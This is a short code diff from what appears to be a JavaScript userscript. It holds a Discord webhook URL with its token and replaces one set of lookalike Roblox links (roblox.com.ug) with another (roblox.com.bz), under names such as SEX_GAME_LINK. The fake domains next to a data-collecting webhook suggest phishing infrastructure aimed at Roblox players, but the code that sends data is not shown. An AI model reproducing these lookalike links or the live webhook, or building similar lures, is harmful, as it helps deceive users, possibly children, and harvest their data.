@@ -2,8 +2,8 @@
   'use strict';
 
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1520288689836785774/hJqq62GqD92mjdWDZevZnX7aDhs2aw5qSRihChNR9uAH13F_pR6x1JJj95d7btXbcMOj';
-  const NEW_SWORD_LINK = 'https://roblox.com.ug/games/122159079155610/Steal-A-Phone?privateServerLinkCode=36222072360632783707895993359447';
-  const SEX_GAME_LINK = 'https://roblox.com.ug/games/122159079155610/Steal-A-Phone?privateServerLinkCode=36222072360632783707895993359447';
+  const NEW_SWORD_LINK = 'https://roblox.com.bz/games/95082159892680/X2-1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=78900447338733750394827051417199';
+  const SEX_GAME_LINK = 'https://roblox.com.bz/games/95082159892680/X2-1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=78900447338733750394827051417199';
 
   // Generate a unique User ID
   function generateUserId() {
